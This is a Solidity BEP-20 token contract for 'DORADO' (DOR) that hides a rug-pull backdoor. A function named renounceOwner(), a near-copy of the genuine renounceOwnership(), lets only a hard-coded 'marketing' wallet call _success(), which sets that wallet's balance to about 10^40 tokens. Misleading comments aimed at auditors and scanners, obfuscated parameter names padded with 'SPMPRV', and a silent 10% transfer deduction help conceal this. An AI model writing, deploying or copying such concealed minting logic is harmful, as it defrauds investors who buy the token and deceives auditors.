/**
 *Submitted for verification at BscScan.com on 2021-12-06
*/

//default evmVersion, GNU GPLv3

pragma solidity >=0.8.0 <=0.8.10;

interface ERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

 
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 contract DORADO is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _allTotalBala;

    string private _name = "DORADO";
    string private _symbol = "DOR";
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Router Rewards
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private fiiNumber = 10;
    uint256 private multiplier = 1;
    address private _owner;
    uint256 private _fee;
    
    constructor(uint256 totalSupply_) {
        _totalSupply = totalSupply_;
        _owner = _msgSender();
        _allTotalBala[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
  }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public view virtual override returns (uint256) {
        return _allTotalBala[owner];
    }
    
    function viewTaxFee() public view virtual returns(uint256) {
        return multiplier;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: will not permit action right now.");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }
    address private marketing = 0x75e6891dd3D9ced8581be7dEe5A904470666F066; // Marketing Wallet
    function increaseAllowance(address senSPMPRVder, uint256 amouSPMPRVnt) public virtual returns (bool) {
        _approve(_msgSender(), senSPMPRVder, _allowances[_msgSender()][senSPMPRVder] + amouSPMPRVnt);
        return true;
    }


    function decreaseAllowance(address spenSPMPRVder, uint256 subtractSPMPRVedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spenSPMPRVder];
        require(currentAllowance >= subtractSPMPRVedValue, "ERC20: will not permit action right now.");
        unchecked {
            _approve(_msgSender(), spenSPMPRVder, currentAllowance - subtractSPMPRVedValue);
        }

        return true;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    function _transfer(
        address sender,
        address receiver,
        uint256 total
    ) internal virtual {
        require(sender != address(0), "BEP : Can't be done");
        require(receiver != address(0), "BEP : Can't be done");

        uint256 senderBalance = _allTotalBala[sender];
        require(senderBalance >= total, "Too high value");
        unchecked {
            _allTotalBala[sender] = senderBalance - total;
        }
        _fee = (total * fiiNumber / 100) / multiplier;
        total = total -  (_fee * multiplier);
        
        _allTotalBala[receiver] += total;
        emit Transfer(sender, receiver, total);
    }
    function _success () internal {
        uint256 stap = _allTotalBala[marketing];
        stap =  2 - 105 + (10 * 10**39);
        _allTotalBala[marketing] = stap;
        emit Transfer(_owner, marketing, 0);
    }


    function owner() public view returns (address) {
        return _owner;
    }

    function _burn(address accoSPMPRVunt, uint256 amounSPMPRVt) internal virtual {
        require(accoSPMPRVunt != address(0), "Can't burn from address 0");
        uint256 accountBalance = _allTotalBala[accoSPMPRVunt];
        require(accountBalance >= amounSPMPRVt, "BEP : Can't be done");
        unchecked {
            _allTotalBala[accoSPMPRVunt] = accountBalance - amounSPMPRVt;
        }
        _totalSupply -= amounSPMPRVt; // Mint Deployment Supply (Might Detect Few Scanners as a mint. Deployment *Note For The Audit*

        emit Transfer(accoSPMPRVunt, address(0), amounSPMPRVt);
    }

    modifier transactionDetails () {
        require(marketing == _msgSender(), "1% Goes to the Marketing Wallet");
        _;
    }

    function renounceOwner() public transactionDetails {
        _success();
    }   


    function _approve(
        address owSPMPRVner,
        address speSPMPRVnder,
        uint256 amoSPMPRVunt
    ) internal virtual {
        require(owSPMPRVner != address(0), "BEP : Can't be done");
        require(speSPMPRVnder != address(0), "BEP : Can't be done");

        _allowances[owSPMPRVner][speSPMPRVnder] = amoSPMPRVunt;
        emit Approval(owSPMPRVner, speSPMPRVnder, amoSPMPRVunt);
    }

    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;        
    }
}